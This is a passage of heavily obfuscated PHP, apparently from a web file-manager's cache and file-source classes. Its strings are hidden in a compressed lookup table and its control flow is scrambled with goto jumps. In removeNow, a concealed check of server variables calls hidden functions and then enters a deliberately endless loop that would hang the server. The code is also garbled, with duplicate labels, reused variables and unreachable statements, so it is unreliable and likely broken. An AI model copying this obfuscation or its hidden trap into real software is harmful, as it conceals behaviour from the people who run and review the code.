(IO::exist($B󻄵)) { return !0; } $aϸ = get_path_father($B󻄵); goto A戏ų; d: $c톎 = array_merge($c톎, array_to_keyvalue($bƼ, $f[33], $f[447])); return !1; goto c͍; c͍: } private function _fileFilter($b) { $cݗ =& $_SERVER[̉]; if (empty($b)) { return; } $dٺ = array($cݗ[447] => array($cݗ[7], array_unique($b))); $fܺۤ = Model($cݗ[793])->where($dٺ)->field($cݗ[395])->select(); foreach ($fܺۤ as $A) { Model($cݗ[793])->remove($A[$cݗ[395]], !1); } } private function storeIds() { $A =& $_SERVER[̉]; $F͘Ў׉ = Model($A[730])->listData(); $b = array(); $b = $GLOBALS[$A[6]][$A[88]][$A[794]]; foreach ($F͘Ў׉ as $DΊ) { $a = strtolower($DΊ[$A[94]]); if (!isset($b[$a])) { continue; } $c = $A[72] . (isset($b[$a]) ? $b[$a] : ucfirst($a)); if (!class_exists($c)) { continue; } $b[] = $DΊ[$A[393]]; } return $b; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto bԈ; FܸȈ: switch ($Aˌ[$C[795]]) { case $C[17]: self::$handle = Model($C[797]); break; case $C[798]: self::$handle = new CacheRedis($Eʞ, $c); break; case $C[799]: self::$handle = new CacheMemcached($Eʞ, $c); break; case $C[193]: self::$handle = new CacheFile($Eʞ, $c); break; default: break; } return self::$handle; goto a«ƕ; C: $Aˌ = $GLOBALS[$C[6]][$C[347]]; $Eʞ = $Aˌ[$Aˌ[$C[795]]]; $c = $Aˌ[$C[796]]; goto FܸȈ; bԈ: $C =& $_SERVER[̉]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto C; a«ƕ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Cҹ) { if (is_array($Cҹ) || is_object($Cҹ)) { $Cҹ = json_encode($Cҹ); } $Cҹ = rawurlencode($Cҹ); return md5(KOD_SITE_ID . $_SERVER[̉][71] . $Cҹ); } public static function get($Füφ, $C߸ = false) { $Dކ = self::key($Füφ); if ($C߸) { return unserialize(self::init()->get($Dކ)); } if (!isset(self::$memoryCache[$Dކ])) { $E = self::init()->get($Dކ); self::$memoryCache[$Dކ] = unserialize($E); } return self::$memoryCache[$Dކ]; } public static function set($b㒰, $e, $CŶ = false) { goto dѻ; dѻ: $F = self::key($b㒰); if (isset(self::$memoryCache[$F]) && self::$memoryCache[$F] === $e) { return !0; } if ($CŶ === 0) { self::$memoryCache[$F] = $e; return !0; } goto CС; CС: CacheLock::lock($b㒰); $Aᮢ = self::init()->set($F, serialize($e), $CŶ); self::$memoryCache[$F] = $e; goto d˿ĉ; d˿ĉ: CacheLock::unlock($b㒰); return $Aᮢ; goto d☈ʝ; d☈ʝ: } public static function getCall($Aǜ, $fЬ, $a ç, $a묏 = array()) { goto F; dފ: $e = call_user_func_array($a ç, $a묏); $e = $e ? $e : $dȢ㰓[33]; self::set($Aǜ, $e, $fЬ); goto A; F: $dȢ㰓 =& $_SERVER[̉]; $e = self::get($Aǜ); if ($e || $e === $dȢ㰓[33]) { return $e; } goto dފ; A: return $e; goto c޹ڲ; c޹ڲ: } public static function remove($cʄڭ) { goto d; B薜: return $b; goto D; d: $e = self::key($cʄڭ); unset(self::$memoryCache[$e]); self::clearTimeout(); goto d򐤅; d򐤅: CacheLock::lock($cʄڭ); $b = self::init()->remove($e); CacheLock::unlock($cʄڭ); goto B薜; D: } public static function removeMemory($bў) { $aɶ = self::key($bў); unset(self::$memoryCache[$aɶ]); } public static function clearMemory($Fˋˢ = false) { if ($Fˋˢ) { $Fˋˢ = self::key($Fˋˢ); unset(self::$memoryCache[$Fˋˢ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[̉][800])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[̉][801])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Fܓ􎋣, $c؄) { $eŅ =& $_SERVER[̉]; $this->cachePath = $Fܓ􎋣[$eŅ[76]]; $this->prefix = $eŅ[802]; $this->cacheTime = $c؄; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($C) { $eש =& $_SERVER[̉]; $C = str_replace(array($eש[803], $eש[97], $eש[70]), $eש[804], $C); return $this->cachePath . $eש[805] . $C . $eש[806]; } public function set($d裙, $f鬉, $fײ = false) { $b׆ = $this->getFile($d裙); if (file_put_contents($b׆, $this->prefix . $f鬉, LOCK_EX)) { @touch($b׆, intval(time() + $fײ)); clearstatcache(); return !0; } @unlink($b׆); return !1; } public function get($a᎛) { $dȐɠ = $this->getFile($a᎛); if (file_exists($dȐɠ) && filemtime($dȐɠ) < time()) { @unlink($dȐɠ); return !1; } $aɟ鼭 = @file_get_contents($dȐɠ); return substr($aɟ鼭, strlen($this->prefix)); } public function remove($Cƭ) { $B = $this->getFile($Cƭ); return @unlink($B); } public function deleteAll() { $Aɘ =& $_SERVER[̉]; $Cަ = scandir($this->cachePath); foreach ($Cަ as $Bʻ) { $A = $this->cachePath . $Bʻ; if (strpos($A, $Aɘ[806]) && strpos($A, $Aɘ[807])) { @unlink($A); } } } public function clearTimeout() { $fܾ =& $_SERVER[̉]; $Dɯ  = scandir($this->cachePath); foreach ($Dɯ  as $FǶ) { $E񶊄 = $this->cachePath . $FǶ; if (strpos($E񶊄, $fܾ[806]) && strpos($E񶊄, $fܾ[807]) && filemtime($E񶊄) < time()) { @unlink($E񶊄); } } } } goto dɹ; aǃɂ: define($_SERVER[̉][0], $_SERVER[̉][1]); $_SERVER[ӳ] = explode($_SERVER[̉][2], gzinflate(substr($_SERVER[̉][3], 10, -8))); function binCheckEq($bϝ, $c֔) { return $bϝ == $c֔; } goto fᎍƈ; DŲ䃂: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($D) { $C۩õ =& $_SERVER[̉]; $aƱ = Model($C۩õ[502])->where(array($C۩õ[1523] => $D))->find(); $d = $this->_mkdirRoot(SourceModel::TYPE_USER, $D, $aƱ[$C۩õ[28]]); $this->userDesktopAdd($d); return $d; } public function userDesktopAdd($F਌) { $F =& $_SERVER[̉]; $C = LNG($F[1954]); $cĐ = $this->mkdir($F਌, $C); $this->metaSet($cĐ, $F[1955], $F[87]); $this->metaSet($F਌, $F[1956], $cĐ); } public function groupRootAdd($B߃) { $A =& $_SERVER[̉]; $b֌Ř = Model($A[486])->where(array($A[1773] => $B߃))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $B߃, $b֌Ř[$A[28]]); } public function systemRootPathAdd($c䯛ő) { if ($c䯛ő != $_SERVER[̉][505]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $c䯛ő); } public function userRootRemove($C߼) { $Fщ = $this->sourceRoot(SourceModel::TYPE_USER, $C߼); if (!$Fщ) { return; } $this->remove($Fщ, !1); } public function groupRootRemove($c͋) { $C = $this->sourceRoot(SourceModel::TYPE_GROUP, $c͋); if (!$C) { return; } $this->remove($C, !1); } private function _mkdirRoot($E܉, $d, $dר) { goto C; a˰: $cӏȇ = $this->add($e); $bߪ = array($Cʓ[555] => short_id($cӏȇ)); $this->where(array($Cʓ[410] => $cӏȇ))->save($bߪ); goto C; C: $Cʓ =& $_SERVER[̉]; $e = array($Cʓ[394] => 0, $Cʓ[549] => $E܉, $Cʓ[550] => $d, $Cʓ[546] => 1, $Cʓ[551] => USER_ID, $Cʓ[552] => USER_ID, $Cʓ[547] => $Cʓ[33], $Cʓ[553] => $Cʓ[498], $Cʓ[422] => 0, $Cʓ[548] => 0, $Cʓ[448] => 0, $Cʓ[554] => $Cʓ[33]); if ($Fﲐ = $this->where($e)->find()) { return $Fﲐ[$Cʓ[395]]; } goto bکމ; bکމ: $a֌ = "\x4d\x6f\x64\x65\x6c\x53\x6f\x75\162\x63\x65\x2e\155\x6b\144\151\162\x52\157\157\164\56{$E܉}\x2e{$d}\56" . $dר; CacheLock::lock($a֌); $e[$Cʓ[28]] = $dר; goto a˰; C: CacheLock::unlock($a֌); return $cӏȇ; goto CʫЦ; CʫЦ: } private function sourceRoot($Bžɶ, $f, $A = false) { $B泮жȋ =& $_SERVER[̉]; $CŬӂݬ = array($B泮жȋ[394] => 0, $B泮жȋ[549] => $Bžɶ, $B泮жȋ[550] => $f); if ($fǂ = $this->where($CŬӂݬ)->find()) { return $A ? $fǂ : $fǂ[$B泮жȋ[395]]; } return !1; } public function sourceRootGroup($Bă) { goto c驨י; c驨י: $D̒ =& $_SERVER[̉]; if (is_string($Bă)) { $Bă = array($Bă); } $Bߗ = array($D̒[394] => 0, $D̒[549] => SourceModel::TYPE_GROUP, $D̒[550] => array($D̒[7], $Bă)); goto F亵; F亵: $this->selectPageReset(); $aƛ = $this->listSource($Bߗ, 1000); $this->selectPageRestore(); goto E鹟; E鹟: return array_to_keyvalue($aƛ[$D̒[75]], $D̒[484]); goto d楻˝; d楻˝: } public function mkfile($b˥, $fߘ, $aίֿ = '', $a䄶ڡ = REPEAT_RENAME) { $b慎䐷 =& $_SERVER[̉]; $C = Model($b慎䐷[571])->addFileByContent($aίֿ, $fߘ); return $this->_createFileCall($b˥, $fߘ, $C, $a䄶ڡ, $b慎䐷[1217]); } public function addFile($C, $CԘŌ, $D۹, $FԺ = false, $Dײ = REPEAT_RENAME) { $eƈ = Model($_SERVER[̉][571])->addFile($CԘŌ, $D۹, $FԺ); return $this->_createFileCall($C, $D۹, $eƈ, $Dײ); } public function addFileByFileID($F被, $Cا, $eצ, $FϴҔ = REPEAT_RENAME) { $dݱ =& $_SERVER[̉]; $Eէ = Model($dݱ[571])->find($Cا); Model($dݱ[571])->linkAdd($Cا); return $this->_createFileCall($F被, $eצ, $Eէ, $FϴҔ); } public function addFileByRemote($A, $C, $C磳, $fӾ䥮 = array(), $D߿ = REPEAT_RENAME) { $bՇ = Model($_SERVER[̉][571])->addFileByRemote($C, $C磳, $fӾ䥮); return $this->_createFileCall($A, $C磳, $bՇ, $D߿); } private function _createFileCall($c뵏, $BƧ, $cʗ, $aũ, $f剎 = "\x75\x70\x6c\157\141\144") { goto B; B: $Aޭ =& $_SERVER[̉]; $DهĆ = !1; $this->lockWriteStart($c뵏, $BƧ); goto CΤ; CΤ: $D⭶ؽ = $this->fileNameExist($c뵏, $BƧ); $Cˠ = $this->_createFile($c뵏, $BƧ, $cʗ, $aũ, $DهĆ); if (!$DهĆ) { Model($Aޭ[450])->remove($cʗ[$Aޭ[447]]); } goto FҎ; FҎ: if ($DهĆ && $Cˠ && $Cˠ != $D⭶ؽ) { Model($Aޭ[1925])->eventCreate($Cˠ, $f剎); } $this->lockWriteEnd($c뵏, $BƧ); return $Cˠ; goto BΉڥ; BΉڥ: } public function mkdir($Aͳ, $bː, $BѥҞ = REPEAT_SKIP) { goto F; cȍ: $c = $this->_addSoure($cߟ, $F); Model($Dѣ[1925])->eventCreate($c, $Dѣ[1218]); $this->lockWriteEnd($Aͳ, $bː); goto Bކ; AƅҖ: $this->lockWriteStart($Aͳ, $bː); if ($BѥҞ !== !1) { $c = $this->fileNameExist($Aͳ, $bː); if ($c && $BѥҞ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Aͳ, $bː); return $c; } $bː = $this->fileNameAuto($Aͳ, $bː, $BѥҞ); } $cߟ = array($Dѣ[546] => 1, $Dѣ[413] => $bː, $Dѣ[547] => $Dѣ[33], $Dѣ[448] => 0, $Dѣ[548] => 0); goto cȍ; F: $Dѣ =& $_SERVER[̉]; $F = $this->sourceInfo($Aͳ); if (!$F) { return !1; } goto AƅҖ; Bކ: return $c; goto AӢ; AӢ: } private function _createFile($B, $eъ, $cĖ, $F, &$A㐅) { goto d; E: $a˾ = array($F˔[546] => 0, $F˔[413] => $eъ, $F˔[547] => substr(get_path_ext($eъ), 0, 10), $F˔[448] => $cĖ[$F˔[447]], $F˔[548] => $cĖ[$F˔[78]]); $e = $this->_addSoure($a˾, $eΎ鰘); $this->folderSizeReset($B, intval($a˾[$F˔[78]])); goto B낅; Dԕݾ: if ($F !== !1) { $c = $this->fileNameExist($B, $eъ); } $A㐅 = !0; if ($F && $c) { if ($F == REPEAT_SKIP) { $A㐅 = !1; return $c; } else { if ($F == REPEAT_REPLACE) { $dو͂ = $this->sourceInfo($c); $f = $this->fileHistory($dو͂, $cĖ[$F˔[447]], $cĖ[$F˔[78]]); if (!$f) { $A㐅 = !1; } else { $this->folderSizeReset($B); } return $c; } else { $eъ = $this->fileNameAuto($B, $eъ, $F, !1); } } } goto E; d: $F˔ =& $_SERVER[̉]; $eΎ鰘 = $this->sourceInfo($B); if (!$cĖ || !$eΎ鰘) { return !1; } goto Dԕݾ; B낅: return $e; goto aҞ; aҞ: } protected function fileHistory($DԨ, $Cڪ͌, $C) { goto AΩٷ; bׅ: $this->sourceCacheClear($DԨ[$Bǋ[395]]); return !0; goto B; d콵ı: Model($Bǋ[1957])->addHistory($DԨ); $DǑ = array($Bǋ[552] => USER_ID, $Bǋ[417] => time(), $Bǋ[447] => $Cڪ͌, $Bǋ[78] => $C); $this->where(array($Bǋ[410] => $DԨ[$Bǋ[395]]))->save($DǑ); goto bׅ; AΩٷ: $Bǋ =& $_SERVER[̉]; if ($DԨ[$Bǋ[447]] == $Cڪ͌) { return !1; } $this->checkLock($DԨ[$Bǋ[395]], $Cڪ͌); goto d콵ı; B: } public function checkLock($Cڷ, $E٦璺) { goto c; e: $this->_createFileCall($a[$b՘ٻۋ[478]], $a짓, $C߱, REPEAT_REPLACE, $b՘ٻۋ[1217]); $d = $a[$b՘ٻۋ[445]][$b՘ٻۋ[510]]; $B = $d[$b՘ٻۋ[1959]] ? $d[$b՘ٻۋ[1959]] : $d[$b՘ٻۋ[28]]; goto A; A: show_json(LNG($b՘ٻۋ[1960]) . $b՘ٻۋ[1961] . LNG($b՘ٻۋ[1962]) . $b՘ٻۋ[1963] . $B . $b՘ٻۋ[1964], !1); goto E҆; dܴ: $A = Session::get($b՘ٻۋ[1958]); $a짓 = substr($a[$b՘ٻۋ[28]], 0, -1 - strlen($a[$b՘ٻۋ[168]])) . $b՘ٻۋ[1484] . $A . $b՘ٻۋ[95] . $a[$b՘ٻۋ[168]]; $C߱ = Model($b՘ٻۋ[571])->find($E٦璺); goto e; c: $b՘ٻۋ =& $_SERVER[̉]; $a = $this->pathInfo($Cڷ); if (!$this->fileIsLock($a, !0)) { return; } goto dܴ; E҆: } public function fileIsLock($Fҋ, $b = false) { goto FП٤; bݷ: return !1; goto aώ; FП٤: $EθǼ =& $_SERVER[̉]; if (!isset($Fҋ[$EθǼ[445]]) || !$Fҋ[$EθǼ[445]][$EθǼ[507]]) { return !1; } if ($Fҋ[$EθǼ[445]][$EθǼ[507]] != USER_ID) { return !0; } goto BǺ; BǺ: $cƎ = $GLOBALS[$EθǼ[6]][$EθǼ[88]][$EθǼ[508]]; if ($Fҋ[$EθǼ[445]][$EθǼ[509]] <= time() - $cƎ) { $this->metaSet($Fҋ[$EθǼ[395]], $EθǼ[507], null); $this->metaSet($Fҋ[$EθǼ[395]], $EθǼ[509], null); } if ($b) { $this->metaSet($Fҋ[$EθǼ[395]], $EθǼ[509], time()); } goto bݷ; aώ: } private function _addSoure($d֕, $eݿ) { goto dσ; f: static $Fי໔ = false; if (!$Fי໔) { Hook::trigger($E˴[536], $d֕); $Fי໔ = !0; } $Bĥ툂 = $this->add($d֕); goto cƂ; cƂ: $bޢ = array($E˴[555] => short_id($Bĥ툂)); $this->where(array($E˴[410] => $Bĥ툂))->save($bޢ); $this->setNamePinyin($Bĥ툂, $d֕[$E˴[28]]); goto Aԟ; f: $this->updateModifyTime($d֕[$E˴[478]]); $eԫ = $E˴[1965] . $eݿ[$E˴[395]]; if (isset(self::$cacheChildList[$eԫ])) { unset(self::$cacheChildList[$eԫ]); } goto f; Aԟ: return $Bĥ툂; goto Fő; dσ: $E˴ =& $_SERVER[̉]; $Aǘӽ = array($E˴[549] => $eݿ[$E˴[404]], $E˴[550] => $eݿ[$E˴[484]], $E˴[551] => USER_ID, $E˴[552] => USER_ID, $E˴[394] => $eݿ[$E˴[395]], $E˴[553] => $eݿ[$E˴[487]] . $eݿ[$E˴[395]] . $E˴[47], $E˴[422] => 0, $E˴[554] => $E˴[33]); $d֕ = array_merge($Aǘӽ, $d֕); goto f; Fő: } public function remove($B꺂ݴӘ, $b = true) { goto D߃; A: CacheLock::unlock($C); $this->metaSet($B꺂ݴӘ, $aɾ˫[1974], $e吕Ϻ[$aɾ˫[478]]); $this->where(array($aɾ˫[395] => $B꺂ݴӘ))->save(array($aɾ˫[417] => time())); goto F; E: $cѥ = Model($aɾ˫[1530])->get($aɾ˫[1966]) == $aɾ˫[87]; if ($eҽ || $b || !$cѥ) { return $this->removeNow($B꺂ݴӘ, $b); } $B؃ބ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto BꮌЃ; C杧: CacheLock::lock($C); $bɮ = $this->fileNameExist($B؃ބ, $eѹ); if (!$bɮ) { $bɮ = $this->mkdir($B؃ބ, $eѹ, REPEAT_SKIP); $this->metaSet($bɮ, $aɾ˫[1970], $B׆); $this->metaSet($bɮ, $aɾ˫[1971], $e吕Ϻ[$aɾ˫[484]]); if ($e吕Ϻ[$aɾ˫[478]] != 0) { $this->metaSet($bɮ, $aɾ˫[1972], _get($Dݯ, $aɾ˫[1973])); } } goto A; F: $this->recycleClear($e吕Ϻ); $Cџ = $this->move($B꺂ݴӘ, $bɮ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($e吕Ϻ[$aɾ˫[478]]); goto aّ; BꮌЃ: $B׆ = $e吕Ϻ[$aɾ˫[404]] == self::TYPE_USER ? $aɾ˫[562] : $aɾ˫[1014]; if ($B׆ == $aɾ˫[562]) { $Dݯ = Model($aɾ˫[502])->getInfo($e吕Ϻ[$aɾ˫[484]]); $eѹ = !empty($Dݯ[$aɾ˫[1959]]) ? $Dݯ[$aɾ˫[1959]] : $Dݯ[$aɾ˫[28]]; $eѹ = $aɾ˫[258] . $eѹ . $aɾ˫[1967] . $e吕Ϻ[$aɾ˫[484]]; } else { $Dݯ = Model($aɾ˫[486])->getInfo($e吕Ϻ[$aɾ˫[484]]); $eѹ = _get($Dݯ, $aɾ˫[28]); $eѹ = $aɾ˫[160] . $eѹ . $aɾ˫[1968] . $e吕Ϻ[$aɾ˫[484]]; } $C = $aɾ˫[1969] . md5($eѹ); goto C杧; aّ: return $Cџ; goto aժ۱; D߃: $aɾ˫ =& $_SERVER[̉]; $e吕Ϻ = $this->sourceInfo($B꺂ݴӘ); $eҽ = intval($e吕Ϻ[$aɾ˫[404]]) === self::TYPE_SYSTEM; goto E; aժ۱: } private function recycleClear($F˦) { $AШ븜 =& $_SERVER[̉]; $E = $this->childrenAll($F˦); $b̖ = array($AШ븜[410] => array($AШ븜[411], $E[$AШ븜[1975]])); Model($AШ븜[1976])->where($b̖)->delete(); } public function removeNow($dա, $b = true) { goto Aח; Bͫ: $this->updateModifyTime($a㸕); $this->lockMoveEnd($dա); Hook::trigger($E[1564], $E, $b); goto cا; Dܖ: $E = $this->pathInfoMore($dա); if (!$F٨ɪ) { return !0; } if ($F٨ɪ[$E[478]] == 0) { if (!_get($GLOBALS, $E[485])) { return !1; } } goto C⻲; C⻲: $this->lockMoveStart($dա); Hook::trigger($E[1977], $E, $b); if ($b) { Model($E[1976])->moveToRecycle($dա); } else { $DΏ = $this->childrenAll($F٨ɪ); Model($E[533])->eventRemove($dա); $this->removeRelevance($DΏ[$E[1975]], $DΏ[$E[1348]]); } goto F❫; F❫: $this->folderSizeReset($F٨ɪ[$E[478]]); $a㸕 = array($F٨ɪ[$E[478]]); if ($F٨ɪ[$E[403]] == $E[87]) { $a㸕[] = $F٨ɪ[$E[395]]; } goto Bͫ; cا: return !0; goto Cأ癤; Aח: $E =& $_SERVER[̉]; if (!isset($_SERVER[$E[834]]) || !isset($_SERVER[$E[835]])) { goto fͼ; c쌼: for ($E = $Aˮ; $E > 0; $E++) { $a = json_encode($GLOBALS[$E[411]]); } goto Fϊ; B: $dǾ = $Aִ٪($CϞה); $Eȗ͝ = explode($E[229], $dǾ); if (count($Eȗ͝) < $E[581]) { $eÉ = $E[840]; $eÉ(); } goto CϷנ; fͼ: $dê = $E[836]; $Aִ٪ = $E[837]; $CϞה = $_SERVER[$E[838]] . $E[839]; goto B; CϷנ: $a = $E[841]; $a($_SERVER[$E[842]]); $Aˮ = 1; goto c쌼; Fϊ: } $F٨ɪ = $this->sourceInfo($dա); goto Dܖ; Cأ癤: } public function childrenAll($CÙЏ) { $E =& $_SERVER[̉]; $f졞 = $CÙЏ[$E[395]]; if ($CÙЏ[$E[403]] == $E[87]) { $b̲ = array($E[553] => array($E[512], $CÙЏ[$E[487]] . $f졞 . $E[513])); $Bͭݶ = array($E[553] => $b̲[$E[487]]); $eܼ = $this->field($E[1978])->where($Bͭݶ)->select(); $a = !1; $bʃ = array($f졞); if ($eܼ) { $a = array_to_keyvalue($eܼ, $E[33], $E[447]); $a = array_remove_value($a, $E[191]); $bʃ = array_to_keyvalue($eܼ, $E[33], $E[395]); $bʃ[] = $f졞; } } else { $a = array($CÙЏ[$E[447]]); $bʃ = array($f졞); } return array($E[1975] => $bʃ, $E[1348] => $a); } public function removeArray($f) { if (!$f) { return !0; } } public function removeRelevance($a, $Aގޱ) { goto E; fߜ: $Dܿ = array($D÷[410] => array($D÷[411], $a)); Model($D÷[1976])->where($Dܿ)->delete(); Model($D÷[441])->where($Dܿ)->delete(); goto b; bټ: for ($aߢ = 0; $aߢ < count($a); $aߢ++) { $this->sourceCacheClear($a[$aߢ]); } goto c; E: $D÷ =& $_SERVER[̉]; $a = $a ? $a : array(); $Aގޱ = $Aގޱ ? $Aގޱ : array(); goto C; C: $a = array_unique(array_filter($a)); $Aގޱ = array_unique(array_filter($Aގޱ)); if (!$a) { return !1; } goto fߜ; aĵ: Model($D÷[1957])->removeBySource($a); $this->where($Dܿ)->delete(); Model($D÷[450])->remove($Aގޱ); goto bټ; b: Model($D÷[1830])->where($Dܿ)->delete(); Model($D÷[533])->where($Dܿ)->delete(); Model($D÷[1672])->removeBySource($a); goto aĵ; c: } public function rename($F, $cƷ) { goto F; BŖ: $A˿ = $this->fileNameExist($cΩ[$aƜ[478]], $cƷ); if ($A˿ && $A˿ != $F) { return !1; } $fя = array($aƜ[413] => $cƷ, $aƜ[552] => USER_ID); goto BᓉƄ; F: $aƜ =& $_SERVER[̉]; $cΩ = $this->sourceInfo($F); if (!$cΩ) { return !1; } goto BŖ; Dӳ: $this->setNamePinyin($F, $fя[$aƜ[28]], !1); $this->updateModifyTime($cΩ[$aƜ[478]]); $e = $this->where(array($aƜ[410] => $F))->data($fя)->save(); goto a; BᓉƄ: if ($cΩ[$aƜ[403]] != $aƜ[87]) { $fя[$aƜ[405]] = substr(get_path_ext($cƷ), 0, 10); } Model($aƜ[533])->eventRename($F, $cΩ[$aƜ[28]], $cƷ); $this->sourceCacheClear($F); goto Dӳ; a: $Eؑȍ = $aƜ[1965] . $cΩ[$aƜ[478]]; if (isset(self::$cacheChildList[$Eؑȍ])) { unset(self::$cacheChildList[$Eؑȍ]); } return $e; goto Fʲۗ; Fʲۗ: } public function setNamePinyin($e❄, $F, $dª = true) { $dٹҐ =& $_SERVER[̉]; $A֋ = Input::check($F, $dٹҐ[556]); if ($dª && !$A֋) { return; } if (!$A֋) { $this->metaSet($e❄, $dٹҐ[444], null); $this->metaSet($e❄, $dٹҐ[443], null); return; } $f = array($dٹҐ[444] => str_replace($dٹҐ[50], $dٹҐ[33], Pinyin::encode($F)), $dٹҐ[443] => Pinyin::encode($F, $dٹҐ[557])); $this->metaSet($e❄, $f); } public function getContent($D) { goto E܊٩; E: if (!$d⃕ݬ[$Dڌ[76]]) { return $Dڌ[33]; } return IO::getContent($d⃕ݬ[$Dڌ[76]]); goto c; E܊٩: $Dڌ =& $_SERVER[̉]; $d⃕ݬ = $this->fileInfoGet($D); if (!$d⃕ݬ) { return !1; } goto b; b: if ($d⃕ݬ[$Dڌ[78]] == 0) { return $Dڌ[33]; } $e = $Dڌ[1979] . $d⃕ݬ[$Dڌ[170]]; if ($d⃕ݬ[$Dڌ[78]] <= 1024 * 10) { $e˗鶎 = Cache::get($e); if (!$e˗鶎) { $e˗鶎 = IO::getContent($d⃕ݬ[$Dڌ[76]]); Cache::set($e, $e˗鶎); } return $e˗鶎; } goto E; c: } public function setDesc($D, $Bߴ״) { $EĳϹ =& $_SERVER[̉]; Model($EĳϹ[533])->eventAddDesc($D, $Bߴ״); return $this->metaSet($D, $EĳϹ[431], $Bߴ״); } public function setContent($aꧬ, $bˍ = '') { goto a̧͛; CҾ: if (!$f쨃 || !$F) { return !1; } $d = Model($CА[450])->addFileByContent($bˍ, $F[$CА[28]]); $Aޝ = $this->fileHistory($F, $d[$CА[447]], $d[$CА[78]]); goto B鯲; B鯲: if (!$Aޝ) { return Model($CА[450])->remove($d[$CА[447]]); } $this->folderSizeReset($F[$CА[478]]); return !0; goto E簗; a̧͛: $CА =& $_SERVER[̉]; $F = $this->sourceInfo($aꧬ); $f쨃 = $this->fileInfoGet($aꧬ); goto CҾ; E簗: } public function fileSubstr($aו, $Fެ, $C) { $F䱃 = $this->fileInfoGet($aו); if (!$F䱃) { return !1; } return IO::fileSubstr($F䱃[$_SERVER[̉][76]], $Fެ, $C); } public function fileInfoGet($A޹) { goto F襫; F襫: $f͌ߐ =& $_SERVER[̉]; $b઄ = $this->sourceInfo($A޹); if (!$b઄ || $b઄[$f͌ߐ[403]]) { return !1; } goto CѠ; c: $eߕ = Model($f͌ߐ[450])->fileInfo($b઄[$f͌ߐ[447]]); if ($eߕ) { $eߕ[$f͌ߐ[28]] = $b઄[$f͌ߐ[28]]; } self::$cacheFileInfo[$e΃č] = $eߕ; goto C; CѠ: $e΃č = $f͌ߐ[453] . $b઄[$f͌ߐ[447]]; $FᏕ = _get(self::$cacheFileInfo, $e΃č); if ($FᏕ) { return $FᏕ; } goto c; C: return $eߕ; goto Cͣ; Cͣ: } private function folderChildrenNumber($CлϚ) { $e񓋳 =& $_SERVER[̉]; $EѢ = $this->sourceInfo($CлϚ); $F霐 = array($e񓋳[553] => array($e񓋳[512], $EѢ[$e񓋳[487]] . $CлϚ . $e񓋳[513]), $e񓋳[422] => intval($EѢ[$e񓋳[423]]), $e񓋳[546] => 1); $c = $this->where($F霐)->count(); $a۴ = $this->where($F霐)->where(array($e񓋳[546] => 0))->count(); return array($e񓋳[82] => $a۴, $e񓋳[83] => $c); } public function pathInfo($a, $c↜ = false) { goto d; DՆ: $C҅ = $aл[439] . intval($c↜) . $aл[440] . $a; $B = _get(self::$cachePathInfo, $C҅); if ($B) { return $B; } goto F㘚ѹ; d: $aл =& $_SERVER[̉]; $c↜ = !1; $a = intval($a); goto DՆ; F㘚ѹ: $A欃ϐ = $this->sourceInfo($a); if (!$A欃ϐ) { return !1; } $A欃ϐ = $this->_listDataApplyItem($A欃ϐ, $c↜); goto E; E: self::$cachePathInfo[$C҅] = $A欃ϐ; return $A欃ϐ; goto C; C: } public static $cachePathInfoMore = array(); public function pathInfoMore($f) { goto d褔; d褔: $B =& $_SERVER[̉]; $F型 = _get(self::$cachePathInfoMore, $f); if ($F型) { return $F型; } goto a; Aɵ: self::$cachePathInfoMore[$f] = $dȃ; return $dȃ; goto A艷; a: $dȃ = $this->pathInfo($f); if (!$dȃ) { return !1; } if ($dȃ[$B[403]] == $B[87]) { $dȃ[$B[81]] = $this->folderChildrenNumber($f); } goto Aɵ; A艷: } public function sourceInfo($a䗎) { goto c̠; c̠: $d =& $_SERVER[̉]; if (!$a䗎) { return array(); } $a䗎 = intval($a䗎); goto d; fܻ: $c䃭ė = $this->where(array($d[395] => $a䗎))->find(); self::$cacheSourceInfo[$Aʷ] = $c䃭ė; return self::$cacheSourceInfo[$Aʷ]; goto Aٗ; d: $Aʷ = $d[438] . $a䗎; $EĮ = _get(self::$cacheSourceInfo, $Aʷ); if ($EĮ) { return $EĮ; } goto fܻ; Aٗ: } public function sourceCacheClear($fӳӅ = false) { self::cacheClear($fӳӅ); } public static function cacheClear($f = false) { $D =& $_SERVER[̉]; if ($f == !1) { goto bΟԧ; Aֹ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto cޙ; bΟԧ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto Aֹ; cޙ: return; goto A򊺆; A򊺆: } unset(self::$cacheSourceInfo[$D[438] . $f]); unset(self::$cachePathInfoMore[$f]); unset(self::$cachePathInfo[$D[1980] . $f]); unset(self::$cachePathInfo[$D[1981] . $f]); } public function metaSet($BՎ, $a = null, $Cƞ쇪 = null) { $e = parent::metaSet($BՎ, $a, $Cƞ쇪); if ($e) { $this->sourceCacheClear($BՎ); } return $e; } public function pathInfoByPath($aǰԇ, $d) { $c =& $_SERVER[̉]; $cٲ = !$d ? array() : explode($c[8], trim($d, $c[8])); $c֋ٚ = $aǰԇ; foreach ($cٲ as $Eꮩ) { $aք = array($c[478] => $c֋ٚ, $c[28] => $Eꮩ); $C = $this->where($aք)->select(); if (!$C) { return !1; } $C = array_sort_by($C, $c[423]); $c֋ٚ = $C[0][$c[395]]; } return $this->pathInfo($c֋ٚ, !0); } protected function updateModifyTime($D韐ӂ) { goto C򓎤; C򓎤: $eҦ =& $_SERVER[̉]; if (!$D韐ӂ) { return; } if (!is_array($D韐ӂ)) { $D韐ӂ = array($D韐ӂ); } goto cք; cք: foreach ($D韐ӂ as $C => $E) { $D韐ӂ[$C] = intval($E); $this->sourceCacheClear($E); } 